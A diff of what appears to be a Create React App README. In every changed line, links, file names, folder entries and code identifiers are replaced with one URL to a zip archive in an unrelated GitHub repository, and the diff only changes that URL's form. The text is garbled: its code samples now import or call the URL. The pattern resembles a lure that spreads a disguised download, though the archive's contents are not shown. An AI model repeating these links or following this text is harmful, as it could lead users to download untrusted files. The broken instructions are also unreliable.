@@ -1,7 +1,7 @@
-This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+This project was bootstrapped with [Create React App](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 Below you will find some information on how to perform common tasks.<br>
-You can find the most recent version of this guide [here](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+You can find the most recent version of this guide [here](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 ## Table of Contents
 
@@ -99,7 +99,7 @@ You can find the most recent version of this guide [here](https://raw.githubuser
   - [`npm run build` exits too early](#npm-run-build-exits-too-early)
   - [`npm run build` fails on Heroku](#npm-run-build-fails-on-heroku)
   - [`npm run build` fails to minify](#npm-run-build-fails-to-minify)
-  - [https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip locales are missing](#momentjs-locales-are-missing)
+  - [https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip locales are missing](#momentjs-locales-are-missing)
 - [Alternatives to Ejecting](#alternatives-to-ejecting)
 - [Something Missing?](#something-missing)
 
@@ -114,15 +114,15 @@ You almost never need to update `create-react-app` itself: it delegates all the 
 
 When you run `create-react-app`, it always creates the project with the latest version of `react-scripts` so you’ll get all the new features and improvements in newly created apps automatically.
 
-To update an existing project to a new version of `react-scripts`, [open the changelog](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), find the version you’re currently on (check `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` in this folder if you’re not sure), and apply the migration instructions for the newer versions.
+To update an existing project to a new version of `react-scripts`, [open the changelog](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), find the version you’re currently on (check `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` in this folder if you’re not sure), and apply the migration instructions for the newer versions.
 
-In most cases bumping the `react-scripts` version in `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` and running `npm install` in this folder should be enough, but it’s good to consult the [changelog](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) for potential breaking changes.
+In most cases bumping the `react-scripts` version in `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` and running `npm install` in this folder should be enough, but it’s good to consult the [changelog](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) for potential breaking changes.
 
 We commit to keeping the breaking changes minimal so you can upgrade `react-scripts` painlessly.
 
 ## Sending Feedback
 
-We are always open to [your feedback](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+We are always open to [your feedback](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 ## Folder Structure
 
@@ -130,32 +130,32 @@ After creation, your project should look like this:
 
 ```
 my-app/
-  https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
+  https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
   node_modules/
-  https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
+  https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
   public/
-    https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
-    https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
+    https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
+    https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
   src/
-    https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
-    https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
-    https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
-    https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
-    https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
-    https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
+    https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
+    https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
+    https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
+    https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
+    https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
+    https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
 ```
 
 For the project to build, **these files must exist with exact filenames**:
 
-* `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` is the page template;
-* `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` is the JavaScript entry point.
+* `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` is the page template;
+* `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` is the JavaScript entry point.
 
 You can delete or rename the other files.
 
 You may create subdirectories inside `src`. For faster rebuilds, only files inside `src` are processed by Webpack.<br>
 You need to **put any JS and CSS files inside `src`**, otherwise Webpack won’t see them.
 
-Only files inside `public` can be used from `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`.<br>
+Only files inside `public` can be used from `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`.<br>
 Read instructions below for using assets from JavaScript and HTML.
 
 You can, however, create more top-level directories.<br>
@@ -202,37 +202,37 @@ You don’t have to ever use `eject`. The curated feature set is suitable for sm
 
 By default, the generated project uses the latest version of React.
 
-You can refer [to the React documentation](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) for more information about supported browsers.
+You can refer [to the React documentation](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) for more information about supported browsers.
 
 ## Supported Language Features and Polyfills
 
 This project supports a superset of the latest JavaScript standard.<br>
-In addition to [ES6](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) syntax features, it also supports:
+In addition to [ES6](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) syntax features, it also supports:
 
-* [Exponentiation Operator](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) (ES2016).
-* [Async/await](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) (ES2017).
-* [Object Rest/Spread Properties](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) (stage 3 proposal).
-* [Dynamic import()](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) (stage 3 proposal)
-* [Class Fields and Static Properties](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) (part of stage 3 proposal).
-* [JSX](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) and [Flow](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) syntax.
+* [Exponentiation Operator](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) (ES2016).
+* [Async/await](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) (ES2017).
+* [Object Rest/Spread Properties](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) (stage 3 proposal).
+* [Dynamic import()](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) (stage 3 proposal)
+* [Class Fields and Static Properties](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) (part of stage 3 proposal).
+* [JSX](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) and [Flow](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) syntax.
 
-Learn more about [different proposal stages](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+Learn more about [different proposal stages](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
-While we recommend using experimental proposals with some caution, Facebook heavily uses these features in the product code, so we intend to provide [codemods](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) if any of these proposals change in the future.
+While we recommend using experimental proposals with some caution, Facebook heavily uses these features in the product code, so we intend to provide [codemods](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) if any of these proposals change in the future.
 
-Note that **the project only includes a few ES6 [polyfills](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)**:
+Note that **the project only includes a few ES6 [polyfills](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)**:
 
-* [`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip()`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) via [`object-assign`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
-* [`Promise`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) via [`promise`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
-* [`fetch()`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) via [`whatwg-fetch`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+* [`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip()`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) via [`object-assign`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
+* [`Promise`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) via [`promise`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
+* [`fetch()`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) via [`whatwg-fetch`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
-If you use any other ES6+ features that need **runtime support** (such as `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip()` or `Symbol`), make sure you are including the appropriate polyfills manually, or that the browsers you are targeting already support them.
+If you use any other ES6+ features that need **runtime support** (such as `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip()` or `Symbol`), make sure you are including the appropriate polyfills manually, or that the browsers you are targeting already support them.
 
-Also note that using some newer syntax features like `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` or `[https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip]` causes Babel to emit code that depends on ES6 runtime features and might not work without a polyfill. When in doubt, use [Babel REPL](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) to see what any specific syntax compiles down to.
+Also note that using some newer syntax features like `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` or `[https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip]` causes Babel to emit code that depends on ES6 runtime features and might not work without a polyfill. When in doubt, use [Babel REPL](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) to see what any specific syntax compiles down to.
 
 ## Syntax Highlighting in the Editor
 
-To configure the syntax highlighting in your favorite text editor, head to the [relevant Babel documentation page](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) and follow the instructions. Some of the most popular editors are covered.
+To configure the syntax highlighting in your favorite text editor, head to the [relevant Babel documentation page](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) and follow the instructions. Some of the most popular editors are covered.
 
 ## Displaying Lint Output in the Editor
 
@@ -255,19 +255,19 @@ Now your editor should report the linting warnings.
 
 Note that even if you edit your `.eslintrc` file further, these changes will **only affect the editor integration**. They won’t affect the terminal and in-browser lint output. This is because Create React App intentionally provides a minimal set of rules that find common mistakes.
 
-If you want to enforce a coding style for your project, consider using [Prettier](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) instead of ESLint style rules.
+If you want to enforce a coding style for your project, consider using [Prettier](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) instead of ESLint style rules.
 
 ## Debugging in the Editor
 
-**This feature is currently only supported by [Visual Studio Code](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) and [WebStorm](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).**
+**This feature is currently only supported by [Visual Studio Code](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) and [WebStorm](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).**
 
 Visual Studio Code and WebStorm support debugging out of the box with Create React App. This enables you as a developer to write and debug your React code without leaving the editor, and most importantly it enables you to have a continuous development workflow, where context switching is minimal, as you don’t have to switch between tools.
 
 ### Visual Studio Code
 
-You would need to have the latest version of [VS Code](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) and VS Code [Chrome Debugger Extension](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) installed.
+You would need to have the latest version of [VS Code](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) and VS Code [Chrome Debugger Extension](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) installed.
 
-Then add the block below to your `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` file and put it inside the `.vscode` folder in your app’s root directory.
+Then add the block below to your `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` file and put it inside the `.vscode` folder in your app’s root directory.
 
 ```json
 {
@@ -288,11 +288,11 @@ Then add the block below to your `https://raw.githubusercontent.com/kobmol/Tugas
 
 Start your app by running `npm start`, and start debugging in VS Code by pressing `F5` or by clicking the green debug icon. You can now write code, set breakpoints, make changes to the code, and debug your newly modified code—all from your editor.
 
-Having problems with VS Code Debugging? Please see their [troubleshooting guide](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+Having problems with VS Code Debugging? Please see their [troubleshooting guide](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 ### WebStorm
 
-You would need to have [WebStorm](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) and [JetBrains IDE Support](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) Chrome extension installed.
+You would need to have [WebStorm](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) and [JetBrains IDE Support](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) Chrome extension installed.
 
 In the WebStorm menu `Run` select `Edit Configurations...`. Then click `+` and select `JavaScript Debug`. Paste `http://localhost:3000` into the URL field and save the configuration.
 
@@ -304,7 +304,7 @@ The same way you can debug your application in IntelliJ IDEA Ultimate, PhpStorm,
 
 ## Formatting Code Automatically
 
-Prettier is an opinionated code formatter with support for JavaScript, CSS and JSON. With Prettier you can format the code you write automatically to ensure a code style within your project. See the [Prettier's GitHub page](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) for more information, and look at this [page to see it in action](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+Prettier is an opinionated code formatter with support for JavaScript, CSS and JSON. With Prettier you can format the code you write automatically to ensure a code style within your project. See the [Prettier's GitHub page](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) for more information, and look at this [page to see it in action](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 To format our code whenever we make a commit in git, we need to install the following dependencies:
 
@@ -319,10 +319,10 @@ yarn add husky lint-staged prettier
 ```
 
 * `husky` makes it easy to use githooks as if they are npm scripts.
-* `lint-staged` allows us to run scripts on staged files in git. See this [blog post about lint-staged to learn more about it](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+* `lint-staged` allows us to run scripts on staged files in git. See this [blog post about lint-staged to learn more about it](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 * `prettier` is the JavaScript formatter we will run before commits.
 
-Now we can make sure every file is formatted correctly by adding a few lines to the `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` in the project root.
+Now we can make sure every file is formatted correctly by adding a few lines to the `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` in the project root.
 
 Add the following line to `scripts` section:
 
@@ -333,7 +333,7 @@ Add the following line to `scripts` section:
     "build": "react-scripts build",
 ```
 
-Next we add a 'lint-staged' field to the `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, for example:
+Next we add a 'lint-staged' field to the `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, for example:
 
 ```diff
   "dependencies": {
@@ -348,9 +348,9 @@ Next we add a 'lint-staged' field to the `https://raw.githubusercontent.com/kobm
   "scripts": {
 ```
 
-Now, whenever you make a commit, Prettier will format the changed files automatically. You can also run `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip --single-quote --write "src/**/*.{js,jsx,json,css}"` to format your entire project for the first time.
+Now, whenever you make a commit, Prettier will format the changed files automatically. You can also run `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip --single-quote --write "src/**/*.{js,jsx,json,css}"` to format your entire project for the first time.
 
-Next you might want to integrate Prettier in your favorite editor. Read the section on [Editor Integration](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) on the Prettier GitHub page.
+Next you might want to integrate Prettier in your favorite editor. Read the section on [Editor Integration](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) on the Prettier GitHub page.
 
 ## Changing the Page `<title>`
 
@@ -358,7 +358,7 @@ You can find the source HTML file in the `public` folder of the generated projec
 
 Note that normally you wouldn’t edit files in the `public` folder very often. For example, [adding a stylesheet](#adding-a-stylesheet) is done without touching the HTML.
 
-If you need to dynamically update the page title based on the content, you can use the browser [`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) API. For more complex scenarios when you want to change the title from React components, you can use [React Helmet](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), a third party library.
+If you need to dynamically update the page title based on the content, you can use the browser [`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) API. For more complex scenarios when you want to change the title from React components, you can use [React Helmet](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), a third party library.
 
 If you use a custom server for your app in production and want to modify the title before it gets sent to the browser, you can follow advice in [this section](#generating-dynamic-meta-tags-on-the-server). Alternatively, you can pre-build each page as a static HTML file which then loads the JavaScript bundle, which is covered [here](#pre-rendering-into-static-html-files).
 
@@ -381,11 +381,11 @@ This works for any library, not just `react-router`.
 ## Importing a Component
 
 This project setup supports ES6 modules thanks to Babel.<br>
-While you can still use `require()` and `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, we encourage you to use [`import` and `export`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) instead.
+While you can still use `require()` and `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, we encourage you to use [`import` and `export`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) instead.
 
 For example:
 
-### `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`
+### `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`
 
 ```js
 import React, { Component } from 'react';
@@ -399,7 +399,7 @@ class Button extends Component {
 export default Button; // Don’t forget to use export default!
 ```
 
-### `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`
+### `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`
 
 
 ```js
@@ -415,7 +415,7 @@ class DangerButton extends Component {
 export default DangerButton;
 ```
 
-Be aware of the [difference between default and named exports](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip). It is a common source of mistakes.
+Be aware of the [difference between default and named exports](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip). It is a common source of mistakes.
 
 We suggest that you stick to using default imports and exports when a module only exports a single thing (for example, a component). That’s what you get when you use `export default Button` and `import Button from './Button'`.
 
@@ -423,26 +423,26 @@ Named exports are useful for utility modules that export several functions. A mo
 
 Learn more about ES6 modules:
 
-* [When to use the curly braces?](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
-* [Exploring ES6: Modules](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
-* [Understanding ES6: Modules](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+* [When to use the curly braces?](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
+* [Exploring ES6: Modules](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
+* [Understanding ES6: Modules](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
 ## Code Splitting
 
 Instead of downloading the entire app before users can use it, code splitting allows you to split your code into small chunks which you can then load on demand.
 
-This project setup supports code splitting via [dynamic `import()`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip). Its [proposal](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) is in stage 3. The `import()` function-like form takes the module name as an argument and returns a [`Promise`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) which always resolves to the namespace object of the module.
+This project setup supports code splitting via [dynamic `import()`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip). Its [proposal](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) is in stage 3. The `import()` function-like form takes the module name as an argument and returns a [`Promise`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) which always resolves to the namespace object of the module.
 
 Here is an example:
 
-### `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`
+### `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`
 
 ```js
 const moduleA = 'Hello';
 
 export { moduleA };
 ```
-### `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`
+### `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`
 
 ```js
 import React, { Component } from 'react';
@@ -461,7 +461,7 @@ class App extends Component {
   render() {
     return (
       <div>
-        <button onClick={https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip}>Load</button>
+        <button onClick={https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip}>Load</button>
       </div>
     );
   }
@@ -470,21 +470,21 @@ class App extends Component {
 export default App;
 ```
 
-This will make `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` and all its unique dependencies as a separate chunk that only loads after the user clicks the 'Load' button.
+This will make `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` and all its unique dependencies as a separate chunk that only loads after the user clicks the 'Load' button.
 
 You can also use it with `async` / `await` syntax if you prefer it.
 
 ### With React Router
 
-If you are using React Router check out [this tutorial](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) on how to use code splitting with it. You can find the companion GitHub repository [here](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+If you are using React Router check out [this tutorial](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) on how to use code splitting with it. You can find the companion GitHub repository [here](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
-Also check out the [Code Splitting](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) section in React documentation.
+Also check out the [Code Splitting](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) section in React documentation.
 
 ## Adding a Stylesheet
 
-This project setup uses [Webpack](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) for handling all assets. Webpack offers a custom way of “extending” the concept of `import` beyond JavaScript. To express that a JavaScript file depends on a CSS file, you need to **import the CSS from the JavaScript file**:
+This project setup uses [Webpack](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) for handling all assets. Webpack offers a custom way of “extending” the concept of `import` beyond JavaScript. To express that a JavaScript file depends on a CSS file, you need to **import the CSS from the JavaScript file**:
 
-### `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`
+### `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`
 
 ```css
 .Button {
@@ -492,11 +492,11 @@ This project setup uses [Webpack](https://raw.githubusercontent.com/kobmol/Tugas
 }
 ```
 
-### `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`
+### `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`
 
 ```js
 import React, { Component } from 'react';
-import 'https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip'; // Tell Webpack that https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip uses these styles
